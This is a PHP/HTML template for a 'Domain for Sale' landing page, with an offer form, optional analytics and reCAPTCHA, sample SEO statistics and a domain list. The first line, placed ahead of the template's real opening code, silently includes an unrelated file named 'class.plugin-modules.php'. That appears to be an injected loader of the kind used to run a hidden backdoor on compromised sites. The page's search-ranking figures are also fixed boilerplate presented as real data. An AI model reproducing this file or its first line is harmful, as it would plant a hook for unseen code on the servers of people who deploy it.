<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
//*************************************************************
// Include Config / Functions
//*************************************************************
require_once "Site-Config.php";
require_once "Site-Functions.php";
?>

<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">

	<link rel="shortcut icon" href="Images/Favicon.png">

	<link rel="stylesheet" href="Styles/Reset.min.css">
	<link rel="stylesheet" href="Styles/Font-Awesome.min.css">
	<link rel="stylesheet" href="Styles/Background.css">
	<link rel="stylesheet" href="Styles/Theme-Orange.css">
	<link rel="stylesheet" href="Styles/Site.css">

	<!--[if lt IE 9]>
		<script src="Scripts/HTML5-Shiv-Print.js"></script>
		<script src="Scripts/HTML5-Shiv.js"></script>
		<script src="Scripts/Placeholders.js"></script>
	<![endif]-->

	<script src="Scripts/JQuery.js"></script>
	<script src="Scripts/Site.js"></script>
	
	<?php if ( '' !== GOOGLE_ANALYTICS_ID ): ?>
		<script>
			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
			})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
	
			ga('create', '<?php echo GOOGLE_ANALYTICS_ID; ?>', 'auto');
			ga('send', 'pageview');
		</script>
	<?php endif; ?>
	
	<?php if ( CAPTCHA_ENABLED ): ?>
		<script src="https://www.google.com/recaptcha/api.js"></script>
	<?php endif; ?>
	
	<title>Domain for Sale!</title>
</head>

<body class="Blue">

<!-- Box -->
<div id="Box">

	<!--========================================================
	>> Header
	=========================================================-->
	<header id="Header">
		<div id="Header-Title">Domain for Sale</div>
	
		<div id="Header-Details">
			<h1><?php echo DOMAIN_NAME; ?></h1>
			<h2>Minimum Bid: <?php echo DOMAIN_PRICE; ?></h2>
		</div>
	</header>
	
	<!--========================================================
	>> Tabs
	=========================================================-->
	<nav id="Tabs">
		<ul class="Tabs-3">
			<li id="Tab-Contact-Form" class="Active Trans No-Select" title="Make an Offer">
				<i class="fa fa-envelope"></i>
				<span>Make an Offer</span>
			</li>
			<li id="Tab-Domain-Stats" class="Trans No-Select" title="Domain Stats">
				<i class="fa fa-bar-chart-o"></i>
				<span>Domain Stats</span>
			</li>
			<li id="Tab-Additional-Domains" class="Trans No-Select" title="Additional Domains">
				<i class="fa fa-list"></i>
				<span>Additional Domains</span>
			</li>
		</ul>
	</nav>
	
	<!--========================================================
	>> Section: Contact Form
	=========================================================-->
	<section id="Contact-Form" class="Section">
	
		<h1 class="Section-Title">Make an Offer</h1>
	
		<form id="Form" class="Clear No-Select" method="POST" action="<?php echo SITE_URL(); ?>Site-Mailer.php">
	
			<div id="Form-Status" class="Error"></div>
	
			<label for="Form-Name">Name</label>
			<input type="text" id="Form-Name" name="Name" placeholder="Name" spellcheck="false" <?php echo REQUIRED_NAME ? "required" : ''; ?>>
	
			<label for="Form-EMail">E-Mail Address</label>
			<input type="text" id="Form-EMail" name="EMail" placeholder="E-Mail Address" spellcheck="false" <?php echo REQUIRED_EMAIL ? "required" : ''; ?>>
	
			<label for="Form-Phone">Phone Number</label>
			<input type="text" id="Form-Phone" name="Phone" placeholder="Phone Number" <?php echo REQUIRED_PHONE ? "required" : ''; ?>>
	
			<label for="Form-Offer">Offer / Bid</label>
			<input type="text" id="Form-Offer" name="Offer" placeholder="Offer / Bid" <?php echo REQUIRED_OFFER ? "required" : ''; ?>>
	
			<label for="Form-Message">Message</label>
			<textarea id="Form-Message" name="Message" placeholder="Message" <?php echo REQUIRED_MESSAGE ? "required" : ''; ?>></textarea>
	
			<?php 
				// ReCAPTCHA Integration - Controlled from Site-Config.php
				if ( CAPTCHA_ENABLED ):
			?>
				<div class="Clear"></div>
				<div id="Form-Captcha">
					<div class="g-recaptcha" data-sitekey="<?php echo CAPTCHA_KEY_PUBLIC; ?>"></div>			
				</div>
			<?php endif; ?>
	
			<div class="Clear"></div>
	
			<input type="submit" id="Form-Submit" value="Send Offer">
			<div id="Form-Sending">Sending...</div>
	
		</form>
	
	</section>
	
	<!--========================================================
	>> Section: Domain Stats
	=========================================================-->
	<section id="Domain-Stats" class="Section Hidden">

		<h1 class="Section-Title">Domain Stats</h1>

		<p>
			<i class="fa fa-star"></i>
			<strong>Excellently Positioned</strong>
			<br>
			This domain is elegantly ranked in all the top search engines and
			primed for type-in traffic. We've tracked the traffic on this 
			domain and we think you'll be impressed.
		</p>

		<p>
			<i class="fa fa-thumbs-up"></i>
			<strong>Quality SEO</strong>
			<br>
			Between backlinks, social media sites, and powerful keywords, this
			domain is ready to go. Get a boost right out of the gate when you
			set your site up!
		</p>

		<div class="Stats-Section">
			<h2>Google Page Rank</h2>
			<h3>PR 3</h3>
		</div>

		<div class="Stats-Section">
			<h2>Google Indexed Pages</h2>
			<h3>17845</h3>
		</div>

		<div class="Stats-Section">
			<h2>Google Backlinks</h2>
			<h3>1532</h3>
		</div>

		<div class="Stats-Section">
			<h2>Alexa Rank</h2>
			<h3>2785</h3>
		</div>

		<div class="Clear"></div>

	</section>
	
	<!--========================================================
	>> Section: Additional Domains
	=========================================================-->
	<section id="Additional-Domains" class="Section Hidden">
	
		<h1 class="Section-Title">Additional Domains</h1>
	
		<p>
			<i class="fa fa-arrow-right"></i>
			<strong>Looking for More?</strong>
			<br>
			We have an amazing catalog of additional domain names available for you!
			Take a look through our selection and let us know if any of these would
			be great for your next website!
		</p>
	
		<?php Domain_List(); ?>
	
	</section>
	
	<!--========================================================
	>> Social Links
	=========================================================-->
	<aside id="Social-Links">
		<ul>
			<li>
				<a href="#" class="Trans" target="_blank" rel="nofollow" title="Like us on Facebook!">
					<i class="fa fa-facebook"></i>
					<span>Facebook</span>
				</a>
			</li>
			<li>
				<a href="#" class="Trans" target="_blank" rel="nofollow" title="Follow us on Twitter!">
					<i class="fa fa-twitter"></i>
					<span>Twitter</span>
				</a>
			</li>
			<li>
				<a href="#" class="Trans" target="_blank" rel="nofollow" title="Follow us on Google+!">
					<i class="fa fa-google-plus"></i>
					<span>Google+</span>
				</a>
			</li>
			<li>
				<a href="#" class="Trans" target="_blank" rel="nofollow" title="Keep up to date on our blog!">
					<i class="fa fa-rss"></i>
					<span>RSS Feed</span>
				</a>
			</li>
		</ul>
	</aside>

</div><!-- END: Box -->

<!--========================================================
>> Footer
=========================================================-->
<footer id="Footer">
	<strong>Call Now</strong>
	<i class="fa fa-phone"></i>
	123.456.7890
</footer>

</body>
</html>